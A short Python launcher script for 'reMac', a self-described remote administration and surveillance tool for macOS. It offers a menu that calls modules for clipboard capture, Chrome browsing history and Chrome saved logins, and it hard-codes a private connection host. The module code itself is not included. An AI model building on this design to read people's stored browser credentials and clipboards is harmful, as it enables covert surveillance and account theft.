import sys, getopt
import os
# import modules.mod_hello
from modules import mod_hello
from modules import mod_clipboard
from modules import mod_chrome_history
from modules import mod_chrome_logins

mymod = mod_hello.mod_hello()
mymodclip = mod_clipboard.mod_clipboard()
mymodchromehist = mod_chrome_history.mod_chrome_history()
mymodchromelogins = mod_chrome_logins.mod_chrome_logins()

authorName = "JeteDonner"
appVer = "0.0.1"
appName = "reMac"
appDesc = "Remote administration and surveillance for macOS - With Python"
appDate = "2021-08-18"
conHost = "192.168.0.49"
conPort = "6890"

def print_help():
    print(f'#========================================================================#')
    print(f'| {appName} - {appDesc} |')
    print(f'| Created by: {authorName}, v.{appVer} {appDate}                             |')
    print(f'|                                                                        |')
    print(f'| Script usage / parameters:                                             |')
    print(f'| -help, -h\t\t\tDisplay this help text                               |')
    print(f'| -server, -s\t\tStart the server                                     |')
    print(f'| -client, -c\t\tStart the server                                     |')
    print(f'| -dev, -d\t\t\tStart developer mode                                 |')
    print(f'#========================================================================#')

def processInput(input):
    if input == "q":
        sys.exit(1)
    elif input == "c":
        mymodclip.run_mod()
    elif input == "ch":
        mymodchromehist.run_mod()
    elif input == "cl":
        mymodchromelogins.run_mod()
    elif input == "d":
        mymodchromelogins.run_mod()

def enterWaitForInput(argv):
    while True:
        c = input("Select your option and press enter:")
        processInput(c)

if __name__ == "__main__":
    # print(f'Number of arguments:', len(sys.argv), 'arguments.')
    if len(sys.argv) == 1:
        print_help()
        enterWaitForInput(sys.argv)
    # else:
    #     main(sys.argv[1:])